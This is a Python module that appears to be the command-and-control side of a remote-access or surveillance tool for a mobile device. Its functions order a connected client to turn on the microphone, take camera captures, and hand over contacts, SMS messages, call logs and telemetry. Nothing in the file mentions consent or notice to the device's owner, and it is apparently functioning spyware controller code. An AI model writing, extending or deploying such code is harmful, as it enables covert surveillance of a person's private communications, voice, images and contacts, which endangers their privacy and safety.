import asyncio
import json
from typing import Any, Dict

from app.config import settings
from app.logger import log_info, log_warn
from app.protocol import send_frame
from app.state import state
from app.tcp.dispatcher import register_pending


async def send_command(cmd: dict) -> None:
    writer = state.client_writer
    if writer is None:
        return
    await send_frame(writer, json.dumps(cmd).encode())


async def cmd_disconnect() -> Dict[str, str]:
    if not state.client_connected():
        return {"status": "no_client"}
    try:
        await send_command({"cmd": "disconnect"})
    except Exception:
        pass
    writer = state.client_writer
    if writer:
        try:
            writer.close()
        except Exception:
            pass
    try:
        await asyncio.wait_for(state.disconnect_event.wait(), timeout=2.0)
    except asyncio.TimeoutError:
        state.clear_client()
    log_info("client disconnected via command")
    return {"status": "disconnected"}


async def cmd_use_mic() -> Dict[str, str]:
    if not state.client_connected():
        return {"status": "no_client"}
    if state.mic_active:
        return {"status": "already_active"}
    state.mic_active = True
    try:
        await send_command({"cmd": "use_mic"})
        log_info("mic stream requested")
        return {"status": "started"}
    except Exception as e:
        state.mic_active = False
        log_warn(f"failed to request mic: {e}")
        return {"status": "error", "message": str(e)}


async def cmd_stop_mic() -> Dict[str, str]:
    state.mic_active = False
    if state.client_connected():
        try:
            await send_command({"cmd": "stop_mic"})
        except Exception:
            pass
    log_info("mic stream stopped")
    return {"status": "stopped"}


async def cmd_get_contacts() -> Dict[str, Any]:
    if not state.client_connected():
        return {"status": "no_client", "path": None}
    fut = register_pending("contacts")
    try:
        await send_command({"cmd": "get_contacts"})
        res = await asyncio.wait_for(fut, timeout=25.0)
        return res
    except asyncio.TimeoutError:
        return {"status": "timeout", "path": None}
    except asyncio.CancelledError:
        return {"status": "cancelled", "path": None}
    except Exception as e:
        return {"status": "error", "message": str(e), "path": None}


async def cmd_get_sms(hours: int = 24) -> Dict[str, Any]:
    if not state.client_connected():
        return {"status": "no_client", "data": []}
    fut = register_pending("sms")
    try:
        await send_command({"cmd": "get_sms", "hours": hours})
        res = await asyncio.wait_for(fut, timeout=25.0)
        return res
    except asyncio.TimeoutError:
        return {"status": "timeout", "data": []}
    except asyncio.CancelledError:
        return {"status": "cancelled", "data": []}
    except Exception as e:
        return {"status": "error", "message": str(e), "data": []}


async def cmd_get_call_logs(hours: int = 24) -> Dict[str, Any]:
    if not state.client_connected():
        return {"status": "no_client", "data": []}
    fut = register_pending("call_logs")
    try:
        await send_command({"cmd": "get_call_logs", "hours": hours})
        res = await asyncio.wait_for(fut, timeout=25.0)
        return res
    except asyncio.TimeoutError:
        return {"status": "timeout", "data": []}
    except asyncio.CancelledError:
        return {"status": "cancelled", "data": []}
    except Exception as e:
        return {"status": "error", "message": str(e), "data": []}


async def cmd_list_cams() -> Dict[str, Any]:
    if not settings.enable_camera:
        return {"status": "disabled", "message": "Camera feature is disabled", "data": []}
    if not state.client_connected():
        return {"status": "no_client", "data": []}
    fut = register_pending("cams")
    try:
        await send_command({"cmd": "list_cams"})
        res = await asyncio.wait_for(fut, timeout=15.0)
        return res
    except asyncio.TimeoutError:
        return {"status": "timeout", "data": []}
    except asyncio.CancelledError:
        return {"status": "cancelled", "data": []}
    except Exception as e:
        return {"status": "error", "message": str(e), "data": []}


async def cmd_use_cam(cam_id: str) -> Dict[str, Any]:
    if not settings.enable_camera:
        return {"status": "disabled", "message": "Camera feature is disabled", "path": None}
    if not state.client_connected():
        return {"status": "no_client", "path": None}
    fut = register_pending("camera_capture")
    try:
        await send_command({"cmd": "use_cam", "cam_id": str(cam_id)})
        res = await asyncio.wait_for(fut, timeout=25.0)
        return res
    except asyncio.TimeoutError:
        return {"status": "timeout", "path": None}
    except asyncio.CancelledError:
        return {"status": "cancelled", "path": None}
    except Exception as e:
        return {"status": "error", "message": str(e), "path": None}


async def cmd_get_telemetry() -> Dict[str, Any]:
    if not state.client_connected():
        return {"status": "no_client", "data": None}
    fut = register_pending("telemetry")
    try:
        await send_command({"cmd": "get_telemetry"})
        res = await asyncio.wait_for(fut, timeout=20.0)
        return res
    except asyncio.TimeoutError:
        return {"status": "timeout", "data": None}
    except asyncio.CancelledError:
        return {"status": "cancelled", "data": None}
    except Exception as e:
        return {"status": "error", "message": str(e), "data": None}
